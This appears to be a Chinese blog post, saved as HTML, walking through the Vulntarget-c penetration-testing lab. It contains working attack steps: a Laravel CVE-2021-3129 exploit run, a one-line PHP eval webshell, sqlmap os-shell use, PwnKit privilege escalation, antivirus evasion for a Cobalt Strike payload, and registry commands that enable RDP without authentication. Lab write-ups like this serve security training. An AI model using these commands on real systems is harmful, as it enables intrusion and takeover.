@@ -1,0 +1,276 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Vulntarget-c | CQJKL</title><meta name="keywords" content="渗透"><meta name="author" content="CQJKL"><meta name="copyright" content="CQJKL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Vulntarget-c环境搭建这里需要把ubuntu20修改一下网卡 root &#x2F; root#qwe 1vim &#x2F;etc&#x2F;netplan&#x2F;00-installer-config.yaml    把这两个改成你自己的桥接或者nat的ip(这里是我已经修改后的样子) 123netplan apply#然后在ip addr 看一下ip修改成功没  flag01fscan扫一扫   然后直接上">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulntarget-c">
+<meta property="og:url" content="http://cqjkl55.github.io/2023/11/24/Vulntarget-c/index.html">
+<meta property="og:site_name" content="CQJKL">
+<meta property="og:description" content="Vulntarget-c环境搭建这里需要把ubuntu20修改一下网卡 root &#x2F; root#qwe 1vim &#x2F;etc&#x2F;netplan&#x2F;00-installer-config.yaml    把这两个改成你自己的桥接或者nat的ip(这里是我已经修改后的样子) 123netplan apply#然后在ip addr 看一下ip修改成功没  flag01fscan扫一扫   然后直接上">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2023-11-24T14:08:06.000Z">
+<meta property="article:modified_time" content="2023-11-24T14:11:07.278Z">
+<meta property="article:author" content="CQJKL">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/eval.png"><link rel="canonical" href="http://cqjkl55.github.io/2023/11/24/Vulntarget-c/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Vulntarget-c',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-24 22:11:07'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/eval.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">CQJKL</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulntarget-c</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-24T14:08:06.000Z" title="发表于 2023-11-24 22:08:06">2023-11-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-24T14:11:07.278Z" title="更新于 2023-11-24 22:11:07">2023-11-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">678</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2023/11/24/Vulntarget-c/" data-flag-title="Vulntarget-c"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Vulntarget-c"><a href="#Vulntarget-c" class="headerlink" title="Vulntarget-c"></a>Vulntarget-c</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里需要把ubuntu20修改一下网卡</p>
+<p>root &#x2F; root#qwe</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>netplan/<span class="number">00</span>-installer-config.yaml</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/24/Vulntarget-c/image-20231123085102747.png" class="">
+
+<p>把这两个改成你自己的桥接或者nat的ip(这里是我已经修改后的样子)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netplan apply</span><br><span class="line"></span><br><span class="line"><span class="comment">#然后在ip addr 看一下ip修改成功没</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>fscan扫一扫</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123085427047.png" class="">
+
+<p>然后直接上脚本进行getshell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SNCKER/</span>CVE-<span class="number">2021</span>-<span class="number">3129</span></span><br><span class="line">cd CVE-<span class="number">2021</span>-<span class="number">3129</span></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ambionics/</span>phpggc.git（exp执行需要使用此工具)</span><br></pre></td></tr></table></figure>
+
+<p>需要修改exp.py中的目标ip</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123092906403.png" class="">
+
+<img src="/2023/11/24/Vulntarget-c/image-20231123092921229.png" class="">
+
+<p>最终在**&#x2F;var&#x2F;www&#x2F;html&#x2F;public**中找到了index.php</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123093317467.png" class="">
+
+<p>然后就是wget本地写的一句话木马</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123094411238.png" class="">
+
+<img src="/2023/11/24/Vulntarget-c/image-20231123094423784.png" class="">
+
+<img src="/2023/11/24/Vulntarget-c/image-20231123095918636.png" class="">
+
+<p>然后进行msf上线</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>  exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                Yes                      The target is vulnerable.</span><br><span class="line"><span class="symbol">2 </span>  exploit/linux/local/pkexec                                         Yes                      The service is running, but could <span class="keyword">not</span> be validated.</span><br><span class="line"><span class="symbol">3 </span>  exploit/linux/local/su_login                                       Yes                      The target appears <span class="keyword">to</span> be vulnerable.</span><br></pre></td></tr></table></figure>
+
+<p>利用第一个<strong>exploit&#x2F;linux&#x2F;local&#x2F;cve_2021_4034_pwnkit_lpe_pkexec</strong>成功提权root</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123095420365.png" class="">
+
+<h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>发现了两张网卡</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123100102755.png" class="">
+
+<p>传个fscan进行扫描</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123142739184.png" class="">
+
+<p>这里环境出现了一点问题，ping不同win2016</p>
+<p>于是就去开启icmp</p>
+<p><strong>Admin#123</strong>进入2016</p>
+<p>然后控制面板-&gt;防火墙</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123142909855.png" class="">
+
+<p>然后就可以ping通了</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123143006561.png" class="">
+
+<img src="/2023/11/24/Vulntarget-c/image-20231123143022222.png" class="">
+
+<p>然后开启frp进行socks代理</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123144321424.png" class="">
+
+<p><strong>10.0.20.100&#x2F;admin</strong> 进入后台登录页面</p>
+<p>admin&#x2F;admin123进入后台</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123144424260.png" class="">
+
+<p>发现存在sql注入</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/?page=appointments/view_details&amp;id=6</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.0.20.100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://10.0.20.100/admin/?page=appointments</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=p8r7qo5p02ubb8komepbhk9sv3</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap一把梭</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="number">1</span><span class="selector-class">.txt</span> <span class="attr">--os-shell</span></span><br></pre></td></tr></table></figure>
+
+<p>然后写马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;^?php <span class="variable">$a</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;d&#x27;</span>];<span class="variable">$a</span> = <span class="string">&quot;<span class="variable">$a</span>&quot;</span>;<span class="variable">$b</span>[<span class="string">&#x27;test&#x27;</span>] = <span class="string">&quot;&quot;</span>;<span class="built_in">eval</span>(<span class="variable">$b</span>[<span class="string">&#x27;test&#x27;</span>].<span class="string">&quot;<span class="variable">$a</span>&quot;</span>);?^&gt;^ &gt; test.php</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑开代理密码d连接</p>
+<p>发现是system权限</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123215427376.png" class="">
+
+<p>上传普通的马不行，需要免杀</p>
+<p>因此这里开了一个cs先上线了ubuntu，然后再上线win2016</p>
+<p>这里用的掩日的免杀，首先cs生成payload.c然后进行下面的免杀</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123215532086.png" class="">
+
+<p>生成.exe 和 .txt</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123215629572.png" class="">
+
+<p>成功上线cs</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123215655310.png" class="">
+
+<img src="/2023/11/24/Vulntarget-c/image-20231123215928428.png" class="">
+
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="language-bash"> <span class="built_in">type</span> C:\Users\Administrator\flag.txt</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vulntarget</span>&#123;VGhlIGhvc3QgcGFzc3dvcmQgbWF5IGJlIHVzZWQgZm9yIG90aGVyIHB1cnBvc2Vz&#125;  <span class="operator">+</span>_<span class="operator">+</span></span><br><span class="line"><span class="keyword">base</span>解密得</span><br><span class="line">The host password may be used <span class="keyword">for</span> other purposes</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>开启3389</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="built_in">add</span> <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE <span class="attribute">ServerName</span>=<span class="string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="built_in">add</span> rule <span class="attribute">name</span>=<span class="string">&quot;Remote Desktop&quot;</span> <span class="attribute">protocol</span>=TCP <span class="attribute">dir</span>=in <span class="attribute">localport</span>=3389 <span class="attribute">action</span>=allow</span><br><span class="line"></span><br><span class="line">reg <span class="built_in">add</span> <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<p>发现了<strong>10.0.10.1&#x2F;24</strong>这个网段</p>
+<p>通过相同得密码进入</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231123222728412.png" class="">
+
+<p>不知道为什么win2016ping不同ubuntu16</p>
+<p>所以只有出此下策，密码也是Admin#123</p>
+<img src="/2023/11/24/Vulntarget-c/image-20231124131421495.png" class="">
+
+<img src="/2023/11/24/Vulntarget-c/image-20231124131454363.png" class="">
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://cqjkl55.github.io">CQJKL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://cqjkl55.github.io/2023/11/24/Vulntarget-c/">http://cqjkl55.github.io/2023/11/24/Vulntarget-c/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://cqjkl55.github.io" target="_blank">CQJKL</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/25/Vulntarget-d/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Vulntarget-d</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/23/Vulntarget-b/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Vulntarget-b</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/08/02/suid%E7%90%86%E8%A7%A3%E5%AD%A6%E4%B9%A0/" title="suid理解学习"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-02</div><div class="title">suid理解学习</div></div></a></div><div><a href="/2023/08/01/%E5%92%8C%E6%88%91%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%89%93%E9%9D%B6-2/" title="和我一起来打靶-2"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-01</div><div class="title">和我一起来打靶-2</div></div></a></div><div><a href="/2023/08/06/%E5%92%8C%E6%88%91%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%89%93%E9%9D%B6-3/" title="和我一起来打靶-3"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-06</div><div class="title">和我一起来打靶-3</div></div></a></div><div><a href="/2023/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/" title="红日靶场1"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-20</div><div class="title">红日靶场1</div></div></a></div><div><a href="/2023/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/" title="红日靶场2"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-20</div><div class="title">红日靶场2</div></div></a></div><div><a href="/2023/09/24/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA3/" title="红日靶场3"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-24</div><div class="title">红日靶场3</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/eval.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">CQJKL</div><div class="author-info__description">天道酬勤，上善若水</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cqjkl55"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">别在该吃苦的年纪选择安逸</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulntarget-c"><span class="toc-number">1.</span> <span class="toc-text">Vulntarget-c</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag01"><span class="toc-number">1.2.</span> <span class="toc-text">flag01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag02"><span class="toc-number">1.3.</span> <span class="toc-text">flag02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag03"><span class="toc-number">1.4.</span> <span class="toc-text">flag03</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/05/Vulntarget-h/" title="Vulntarget-h">Vulntarget-h</a><time datetime="2023-12-05T04:39:47.000Z" title="发表于 2023-12-05 12:39:47">2023-12-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient/" title="春秋云镜-tsclient">春秋云镜-tsclient</a><time datetime="2023-12-02T03:20:24.000Z" title="发表于 2023-12-02 11:20:24">2023-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/29/Vulntarget-f/" title="Vulntarget-f">Vulntarget-f</a><time datetime="2023-11-29T14:18:55.000Z" title="发表于 2023-11-29 22:18:55">2023-11-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/25/Vulntarget-d/" title="Vulntarget-d">Vulntarget-d</a><time datetime="2023-11-25T07:10:21.000Z" title="发表于 2023-11-25 15:10:21">2023-11-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/24/Vulntarget-c/" title="Vulntarget-c">Vulntarget-c</a><time datetime="2023-11-24T14:08:06.000Z" title="发表于 2023-11-24 22:08:06">2023-11-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By CQJKL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'rHMBkLUF0khymCe1WMcvyagF-gzGzoHsz',
+      appKey: 'yX2Chl7sPBez2Fxf7FTq2HH8',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
